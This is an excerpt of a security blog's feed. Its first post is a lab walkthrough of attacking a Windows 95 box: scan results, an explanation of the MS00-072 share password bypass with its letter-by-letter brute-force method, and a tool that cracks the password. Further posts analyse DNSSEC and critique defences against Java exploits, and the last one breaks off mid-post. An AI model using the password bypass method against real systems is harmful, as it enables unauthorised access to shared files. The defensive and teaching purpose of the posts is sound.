&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_04.png&quot; src=&quot;https://z6543.github.io/_img/win95_04.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_04.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_05.png&quot; src=&quot;https://z6543.github.io/_img/win95_05.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_05.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Now that I have a working Windows 95 box, setting up the TCP/IP is easy, let's try to hack it!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;My first tool is always nmap. Let's scan the box! Below I'm showing the interesting parts from the result:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;pre class=&quot;prettyprint linenums lang-html&quot;&gt;PORT      STATE           SERVICE       VERSION
139/tcp   open            netbios-ssn
137/udp   open|filtered   netbios-ns
138/udp   open|filtered   netbios-dgm
Running: Microsoft Windows 3.X|95
OS details: Microsoft Windows for Workgroups 3.11 or Windows 95
TCP Sequence Prediction: Difficulty=25 (Good luck!)
IP ID Sequence Generation: Broken little-endian incremental
&lt;/pre&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The first exciting thing to note is that there is no port 445! Port 445 is only since NT 4.0. If you check all the famous windows sploits (e.g., MS03-026, MS08-067), all of them use port 445 and named pipes. But there are no named pipes on Windows 95!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Because I'm a Nessus monkey, let's run a free Nessus scan on it!&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Only one critical vulnerability found:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Microsoft Windows NT 4.0 Unsupported Installation Detection&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Thanks for nothing, Nessus! But at least it was for free.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Next, I tried GFI Languard, nothing. It detected the machine as Win95, the opened TCP port, and some UDP ports as open (false-positive), and that's all...&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Let's try another free vulnerability scanner tool, Nexpose. The results are much better:&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;CIFS NULL Session Permitted&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt; &lt;/li&gt;&lt;li&gt;Weak LAN Manager hashing permitted&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;&lt;/li&gt;&lt;li&gt;SMB signing not required&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;&lt;/li&gt;&lt;li&gt;Windows 95/98/ME Share Level Password Bypass&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;  &lt;/li&gt;&lt;li&gt;TCP Sequence Number Approximation Vulnerability&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt; &lt;/li&gt;&lt;li&gt;ICMP netmask response&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;&lt;/li&gt;&lt;li&gt;CIFS Share Readable By Everyone&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;I think the following vulnerabilities are useless for me at the moment:&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;Weak LAN Manager hashing permitted - without user interaction or services looking at the network, useless (I might be wrong here, will check this later)&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;&lt;/li&gt;&lt;li&gt;TCP Sequence Number Approximation Vulnerability - not interesting&lt;/li&gt;&lt;li&gt;ICMP netmask response&lt;span style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;- not interesting&lt;/li&gt;&lt;li&gt;CIFS Share Readable By Everyone - unless there is a password in a text file, useless&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;But we have two interesting vulns:&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;CIFS NULL Session Permitted&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt; - this could be interesting, I will check this later ...&lt;/li&gt;&lt;li&gt;Windows 95/98/ME Share Level Password Bypass - BINGO!&lt;/li&gt;&lt;/ul&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Let me quote Nexpose here:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;3.2.3 Windows 95/98/ME Share Level Password Bypass (CIFS-win9x-onebyte-password)&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;A flaw in the Windows 95/98/ME File and Print Sharing service allows unauthorized users to access file and print shares by sending the first character of the password. Due to the limited number of attempts required to guess the password, brute force attacks can be performed in just a few seconds.&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;Established connection to share TEST with password P.&quot;&lt;/div&gt;&lt;/div&gt;
&lt;div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The vulnerability description at MS side:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://technet.microsoft.com/en-us/security/bulletin/ms00-072&quot;&gt;http://technet.microsoft.com/en-us/security/bulletin/ms00-072&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;For example if the password is &quot;Password&quot; (without quotes) and the client sends the password &quot;P&quot; (without quotes) and the length of 1, the client is authenticated. To find the rest of the password, the attacker increments the length to 2 and starts guessing the second letter until he reaches &quot;PA&quot; and gets authenticated again. As share passwords in Windows 95 are not case sensitive, &quot;Pa&quot; and &quot;PA&quot; will also be accepted. The attacker can continue to increment the length and guessing the next letter one-by-one until he gets the full &quot;PASSWORD&quot; (as the maximum length is 8 characters).&lt;br /&gt;&lt;br /&gt;I believe all characters between ALT+033 and ALT+255 can be used in the share password in Windows 95, but as it is case insensitive, we have 196 characters to use, and a maximum length of 8 characters. In worst case this means that we can guess the full password in 1568 requests. The funny thing is that the share password is not connected to (by default) any username/account, and it cannot be locked via brute force.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Luckily there is a great tool which can exploit this vulnerability:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://www.securityfriday.com/tools/SPC.html&quot;&gt;Share Password Checker&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Let's check this tool in action:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/spc_hack.png&quot; src=&quot;https://z6543.github.io/_img/spc_hack.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/spc_hack.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;W00t w00t, it brute forced the password in less then 2 seconds!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Looking at a wireshark dump we can see how it is done:&lt;/div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
&lt;a href=&quot;https://z6543.github.io/_img/wireshark.png&quot; src=&quot;https://z6543.github.io/_img/wireshark.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/wireshark.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;As you can see, in the middle of the dump we can see that it already guessed the part &quot;PASS&quot; and it is brute-forcing the fifth character, it founds that &quot;W&quot; is the correct fifth character, and starts brute-forcing the sixth character.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If we are lucky with the CTF, the whole C:\ drive is shared with full read-write access, and we can write our team identifier into the c:\flag.txt. But what if we want remote code execution? Stay tuned, this is going to be the topic of the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/05/hacking-windows-95-part-2.html&quot;&gt;next part of this post&lt;/a&gt;.&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>DNSSEC, from an end-user perspective, part 3</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dns/hijack/spoofing/dnssec/2014/01/25/DNSSEC,-from-an-end-user-perspective,-part-3.html"/>
   <updated>2014-01-25T15:55:35+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dns/hijack/spoofing/dnssec/2014/01/25/DNSSEC,-from-an-end-user-perspective,-part-3</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;In the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2013/12/dnssec-from-end-user-perspective-part-1.html&quot; target=&quot;_blank&quot;&gt;first post&lt;/a&gt; of this DNSSEC series, I have shown the problem (DNS vulnerabilities), and in the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/01/dnssec-from-end-user-perspective-part-2.html&quot; target=&quot;_blank&quot;&gt;second post&lt;/a&gt;, the &quot;solution.&quot; In this third post, I am going to analyze DNSSEC. Can DNSSEC protect the users against all of the attacks? Or just part of them? What about corner cases?&lt;/div&gt;
&lt;p&gt;The following list are the attack types from the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2013/12/dnssec-from-end-user-perspective-part-1.html&quot; target=&quot;_blank&quot;&gt;first post&lt;/a&gt;, where DNSSEC &lt;u&gt;&lt;b&gt;can&lt;/b&gt;&lt;/u&gt; protect the users:&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;DNS cache poisoning the DNS server, &quot;Da Old way&quot;&lt;/li&gt;&lt;li&gt;DNS cache poisoning, &quot;&lt;a href=&quot;http://www.iana.org/about/presentations/davies-viareggio-entropyvuln-081002.pdf&quot; target=&quot;_blank&quot;&gt;Da Kaminsky way&lt;/a&gt;&quot;&lt;/li&gt;&lt;li&gt;ISP hijack, for advertisement or spying purposes&lt;/li&gt;&lt;li&gt;Captive portals&lt;/li&gt;&lt;li&gt;Pentester hijacks DNS to test application via active man-in-the-middle&lt;/li&gt;&lt;li&gt;Malicious attacker hijacks DNS via active MITM&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The following list are the attack types from the &lt;a href=&quot;http://jumpespjump.blogspot.hu/2013/12/dnssec-from-end-user-perspective-part-1.html&quot; target=&quot;_blank&quot;&gt;first post&lt;/a&gt;, where DNSSEC &lt;u style=&quot;font-weight: bold;&quot;&gt;cannot&lt;/u&gt; protect the users:&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Rogue DNS server set via malware&lt;/li&gt;&lt;li&gt;Having access to the DNS admin panel and rewriting the IP&lt;/li&gt;&lt;li&gt;ISP hijack, for advertisement or spying purposes&lt;/li&gt;&lt;li&gt;Captive portals&lt;/li&gt;&lt;li&gt;Pentester hijacks DNS to test application via active man-in-the-middle&lt;/li&gt;&lt;li&gt;Malicious attacker hijacks DNS via active MITM&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;If you are a reader who thinks while reading, you might say &quot;What the hell? Am I protected or not???&quot;. The problem is that it depends… In the case where the attacker is between you and your DNS server, the attacker can impersonate the DNS server, downgrade it to a non DNSSEC aware one, and send responses without DNSSEC information.&lt;/div&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;div&gt;Now, how can I protect against all of these attacks? Answer is &quot;simple&quot;:&lt;/div&gt;
&lt;div&gt;&lt;ol&gt;&lt;li&gt;Configure your own DNSSEC aware server on your localhost, and use that as a resolver. This is pretty easy, even I was able to do it &lt;a href=&quot;http://www.howtoforge.com/configuring-dnssec-on-bind9-9.7.3-on-debian-squeeze-ubuntu-11.10&quot; target=&quot;_blank&quot;&gt;using tutorials&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;Don't let malware run on your system! ;-)&lt;/li&gt;&lt;li&gt;Use at least two-factor authentication for admin access of your DNS admin panel.&lt;/li&gt;&lt;li&gt;Use a registry lock (details in &lt;a href=&quot;http://jumpespjump.blogspot.hu/2013/12/dnssec-from-end-user-perspective-part-1.html&quot; target=&quot;_blank&quot;&gt;part 1&lt;/a&gt;).&lt;/li&gt;&lt;li&gt;Use a DNSSEC aware OS.&lt;/li&gt;&lt;li&gt;Use DNSSEC protected websites.&lt;/li&gt;&lt;li&gt;There is a need for an API or something, where the client can enforce DNSSEC protected answers. In case the answer is not protected with DNSSEC, the connection can not be established.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;Now some random facts, thoughts, solutions around DNSSEC:&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;Did you know .SE signed its zone with DNSSEC in September 2005, as the first TLD in the world?&lt;/li&gt;&lt;li&gt;Did you know DNSSEC was first deployed at the root level on July 15, 2010?&lt;/li&gt;&lt;li&gt;Did you know &lt;a href=&quot;https://xs.powerdns.com/dnssec-nl-graph/&quot; target=&quot;_blank&quot;&gt;.NL become the first TLD to pass 1 million DNSSEC-signed domain names&lt;/a&gt;?&lt;/li&gt;&lt;li&gt;Did you know that &lt;a href=&quot;http://deneb.iszt.hu/dnssec-hu/&quot; target=&quot;_blank&quot;&gt;Hungary is in the testing phase of DNSSEC&lt;/a&gt; (watch out, it is Hungarian)?&lt;/li&gt;&lt;li&gt;Did you know that &lt;a href=&quot;https://addons.mozilla.org/en-us/firefox/addon/dnssec-validator/&quot; target=&quot;_blank&quot;&gt;you can also use and test that cool DNSSEC validator&lt;/a&gt;?&lt;/li&gt;&lt;li&gt;Did you know that &lt;a href=&quot;http://www.opendns.com/about/innovations/dnscrypt/&quot; target=&quot;_blank&quot;&gt;there are alternative solutions like DNSCrypt&lt;/a&gt;?&lt;/li&gt;&lt;li&gt;Did you know that in the future you might be able to enforce &lt;a href=&quot;http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&quot; target=&quot;_blank&quot;&gt;HSTS&lt;/a&gt; via DNSSEC?&lt;/li&gt;&lt;li&gt;Did you know that in the future you might be able to use &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS-based_Authentication_of_Named_Entities&quot; target=&quot;_blank&quot;&gt;certificate pinning via DNSSEC&lt;/a&gt;?&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;That's all folks, happy DNSSEC configuring ;-)&lt;/div&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Note from David&lt;/b&gt;:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Huh, I have just accidentally deleted this whole post from Z, but then I got it back from my browsing cache. Big up to Nir Sofer for his &lt;a href=&quot;http://www.nirsoft.net/utils/chrome_cache_view.html&quot; target=&quot;_blank&quot;&gt;ChromeCacheView&lt;/a&gt; tool! Saved my ass from kickin'! :D&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>DNSSEC, from an end-user perspective, part 2</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dig/dnssec/security/2014/01/06/DNSSEC,-from-an-end-user-perspective,-part-2.html"/>
   <updated>2014-01-06T15:54:34+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dig/dnssec/security/2014/01/06/DNSSEC,-from-an-end-user-perspective,-part-2</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://jumpespjump.blogspot.hu/2013/12/dnssec-from-end-user-perspective-part-1.html&quot;&gt;In our previous blog post&lt;/a&gt;, we have discussed some of the threats against current DNS systems, where the result was that the victim landed on a different resource/website as he/she originally supposed to visit.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Since this is not a guide for DNS server operators about DNSSEC implementation, let's jump to the user side and see what you should know if you visit a website where DNSSEC validation fails (like the test site &lt;a href=&quot;http://www.dnssec-failed.org/&quot; target=&quot;_blank&quot;&gt;http://www.dnssec-failed.org/&lt;/a&gt;) and you use a DNS server which validates the DNSSEC responses (e.g., 8.8.8.8 - Google public DNS server):&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dnssec_notreachable.png&quot; src=&quot;https://z6543.github.io/_img/dnssec_notreachable.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dnssec_notreachable.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;So far, so good :-) The malicious attacker's evil plan has failed. But what should you see when the server is protected with DNSSEC, and the DNSSEC response is valid/trusted?&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/DNSSEC_valid.png&quot; src=&quot;https://z6543.github.io/_img/DNSSEC_valid.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/DNSSEC_valid.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Please note that this &lt;a href=&quot;https://addons.mozilla.org/en-us/firefox/addon/dnssec-validator/&quot; target=&quot;_blank&quot;&gt;&quot;green key&quot; stuff&lt;/a&gt; is for experimental purposes only. I hope the users should not have to look for another SSL-like padlock in their browser in the future. The critical thing here is that the site has been rendered by the browser, and the response is protected by DNSSEC, thus eliminating lots of threats.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;When you visit a site that is protected by DNSSEC, but your DNS server does not validate the DNSSEC, the site will be served and rendered in your browser. It does not matter if it has untrusted or invalid DNSSEC records. This is the same experience what you have today with no DNSSEC at all:&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/dnssec_untr.png&quot; src=&quot;https://z6543.github.io/_img/dnssec_untr.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/dnssec_untr.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;OK, so we, as end-users, need sites/domains which are protected with DNSSEC, and a DNS server which validates the DNSSEC records. We have the DNS server (thx Google!), so let's find some popular sites which are using DNSSEC!&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/44540147.jpg&quot; src=&quot;https://z6543.github.io/_img/44540147.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/44540147.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;To demonstrate my 133t h4cking skills, here is a small bash script. You give a file with the list of domains as a first parameter to the bash script, and it will give you back the areas protected with DNSSEC.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;pre class=&quot;prettyprint linenums lang-bash&quot;&gt;#!/bin/bash
dig . DNSKEY | grep -Ev '^($|;)' &amp;gt; root.keys
while read line
do
    if dig +sigchase +trusted-key=root.keys $line. A @8.8.8.8 | grep --quiet &quot;DNSSEC validation is ok: SUCC&quot;; then
        echo $line
    fi
done &amp;lt; $1
&lt;/pre&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Alexa was not kind enough to give me a recent list of top sites in text format, so I have used &lt;a href=&quot;http://moz.com/top500&quot;&gt;http://moz.com/top500&lt;/a&gt; for this test.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The results were quite shocking; the first result was at TOP40: &lt;a href=&quot;http://gov.uk/&quot;&gt;gov.uk&lt;/a&gt; - but when you visit gov.uk via browser, it is redirected to a subdomain that is not protected with DNSSEC, so this kind of behavior is considered as FAIL.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;TOP69: &lt;a href=&quot;http://nih.gov/&quot;&gt;nih.gov&lt;/a&gt;  - so ironically, the winner is the National Institute of Health :P&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
Other interesting one where:

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://mozilla.org/&quot;&gt;mozilla.org&lt;/a&gt; - FAIL &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://cdc.gov/&quot;&gt;cdc.gov&lt;/a&gt; - FAIL&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://nasa.gov/&quot;&gt;nasa.gov&lt;/a&gt; - FAIL :(&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://ca.gov/&quot;&gt;ca.gov&lt;/a&gt;  - California homepage, don't mess with Arnie!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://noaa.gov/&quot;&gt;noaa.gov&lt;/a&gt; - National Oceanic and Atmospheric Administration :)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://berkeley.edu/&quot;&gt;berkeley.edu&lt;/a&gt; - thank god the world of universities is saved&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://loc.gov/&quot;&gt;loc.gov&lt;/a&gt; - FAIL&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;http://whitehouse.gov/&quot;&gt;whitehouse.gov&lt;/a&gt; - FAIL …&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I think I have never ever visited these websites before, except the Berkeley one. If you can find a financial institution which website's domain is protected by DNSSEC, let me know. I was not able to find one… For example, paypal.com is a bad example. The main domain is protected with DNSSEC, but not the www.paypal.com.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In the next part of our DNSSEC series, I will write about the threats eliminated by DNSSEC and some other exciting things.&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Effective blocking of Java exploits in enterprise environments</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/0-day/blocking/enterprise/security/java/xx/2013/12/30/Effective-blocking-of-Java-exploits-in-enterprise-environments.html"/>
   <updated>2013-12-30T10:49:41+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/0-day/blocking/enterprise/security/java/xx/2013/12/30/Effective-blocking-of-Java-exploits-in-enterprise-environments</id>
   <content type="html">&lt;h2&gt;
Preface&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&quot;Java every day&quot; was a joke about Java vulnerabilities, where almost every day, a new Java zero-day was seen. Recently, the &quot;Java 0-day spotted in the wild&quot; is no longer in the headlines every week (see &lt;a href=&quot;http://java-0day.com/&quot; target=&quot;_blank&quot;&gt;http://java-0day.com&lt;/a&gt;), but Java exploits are still the most significant concern regarding exploit kits and drive-by-download malware. In a recent &lt;a href=&quot;https://www.securelist.com/en/analysis/204792318/Kaspersky_Security_Bulletin_2013_Overall_statistics_for_2013#06&quot; target=&quot;_blank&quot;&gt;Kaspersky report&lt;/a&gt;, they found that about 90% of the exploit kits were trying to infect the victim machine via Java.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;http://www.pcworld.com/article/261562/six_ways_to_protect_against_the_new_actively_exploited_java_vulnerability.html&quot; target=&quot;_blank&quot;&gt;The &quot;typical useless&quot; recommendations&lt;/a&gt;&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Okay, so we have a problem called Java in the browser, let's look for a solution!&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
The two most straightforward &quot;solutions&quot; of all are:&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;Update your Java.&lt;/li&gt;
&lt;li&gt;Remove Java from your browser.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Both solutions are non-solutions for enterprises. Still, a hell a lot of in-house-built applications need old Java - e.g., 1.6.x, which is end-of-life since February 2013.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
The next recommended &quot;solution&quot; is: &quot;Create separate browsers for Internet and intranet usage. The intranet facing browser supports Java, the Internet-facing does not.&quot;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Although this sounds pretty effective, there are still a lot of problems with this approach. Now IT has to update two browsers instead of one. Users have to be trained, and in a web-security gateway (web proxy), one has to configure that this browser can go there, but the other can't, etc. And still, there might be Java applet based applications outside of the organization which has to be used by a bunch of people.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Next solution: &quot;Use NoScript&quot;.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
LOL. Teach NoScript to 50000 users, and see how they will learn the &quot;Allow all this page&quot; first, and &quot;Allow scripts globally&quot; the next time.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Next solution: &quot;Click-to-play&quot;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
I think this is a good countermeasure, but from now on, the exploit maker either need an &lt;a href=&quot;http://malware.dontneedcoffee.com/2013/09/jre7u21-and-earlier-click-2-play.html&quot; target=&quot;_blank&quot;&gt;exploit to bypass the click-to-play&lt;/a&gt;, or to socially engineer the user to click, so this is not a bulletproof solution either.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
The solution&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Okay, so far, we have five totally useless recommendations. The next one seems pretty good at first sight: &quot;White-list websites which need Java, and only allow Java to these sites.&quot;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Let's dig deeper. How can we &quot;white-list&quot; sites? This is not supported by Java out-of-the-box. In a decent web-security gateway, one can create white-lists, but we have to define a condition for Java traffic. A &lt;a href=&quot;https://kb.bluecoat.com/index?page=content&amp;amp;id=KB5459&amp;amp;actp=LIST&quot; target=&quot;_blank&quot;&gt;common misconception&lt;/a&gt; is to say: let's identify Java traffic for .class, .jar, and .jnlp file extensions, and only allow Java for white-listed websites. Although this will block some exploits, but not all.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Here is a screenshot from the trendy Neutrino exploit kit:&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
